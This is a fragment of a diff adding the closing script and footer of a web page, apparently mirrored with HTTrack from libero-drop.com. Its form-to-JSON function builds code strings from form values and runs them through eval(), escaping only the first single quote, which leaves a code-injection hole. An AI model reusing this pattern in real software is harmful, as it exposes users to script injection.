+                        eval(elemObjName + '[' + Object.keys(eval(elemObjName)).length + '] = \'' + element['value'].replace("'", "\\'") + '\';');
+                    } else {
+                        eval(elemObjName + '[' + value + ' = \'' + element['value'].replace("'", "\\'") + '\';');
+                    }
+                } else {
+                    eval(elemObjName + '.' + value + ' = \'' + element['value'].replace("'", "\\'") + '\';');
+                }
+            }
+        });
+    });
+
+    return jsonOutput;
+}
+  </script>
+</body>
+
+
+
+<!-- Mirrored from libero-drop.com/app/index.html by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 28 Mar 2022 19:39:02 GMT -->
+</html>
